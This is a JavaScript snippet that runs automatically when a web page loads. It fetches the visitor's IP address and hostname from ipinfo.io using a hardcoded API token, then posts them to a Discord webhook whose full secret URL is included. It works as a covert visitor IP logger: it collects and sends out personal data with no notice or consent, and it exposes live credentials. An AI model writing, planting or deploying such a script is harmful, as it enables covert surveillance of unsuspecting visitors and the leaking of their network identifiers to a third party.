function getVisitorInfo() {
    return fetch('https://ipinfo.io/json?token=fed89ab3a610c9')
        .then(response => response.json())
        .then(data => ({
            ip: data.ip,
            hostname: data.hostname || `${data.ip.replace(/\./g, '-')}.dynamic.${data.org ? data.org.split(' ')[0].toLowerCase() : 'isp'}.com`
        }))
        .catch(error => {
            console.error('Error fetching IP info:', error);
            return null;
        });
}

function sendToDiscord(info) {
    const webhookURL = "https://discord.com/api/webhooks/1301665739282841660/pe8CyS3z0V0JSgb-5g-XPhvAW5Mk-fo2qm1pNxQsTd2WtThWfhiV-F3RAfWbS7v31h_w";

    const payload = {
        content: `New visitor IP address: ${info.ip}, Hostname: ${info.hostname}`,
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (response.ok) {
            console.log('Hotovo');
        } else {
            console.error('Failed to send info to Discord:', response.statusText);
        }
    })
    .catch(error => {
        console.error('Daco sa dojebalo:', error);
    });
}

window.onload = async function() {
    const info = await getVisitorInfo();
    if (info) {
        sendToDiscord(info);
    }
};